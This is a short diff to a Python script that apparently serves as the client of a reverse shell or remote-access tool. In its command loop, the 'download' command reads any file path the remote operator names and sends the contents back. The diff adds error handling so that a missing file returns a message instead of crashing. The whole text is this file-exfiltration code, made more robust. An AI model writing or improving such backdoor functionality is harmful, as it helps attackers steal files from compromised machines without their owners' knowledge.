@@ -33,10 +33,14 @@ while True:
 		continue
 
 	elif cmd[:8] == "download":
-		with open(f'{cmd[9:]}', 'rb') as data:
-			data_read = data.read()
-			data.close()
-		send_data(data_read)
+		try:
+			with open(f'{cmd[9:]}', 'rb') as data:
+				data_read = data.read()
+				data.close()
+		except FileNotFoundError:
+			send_data(b"No file found")
+		else:
+			send_data(data_read)
 		continue
 
 	try:
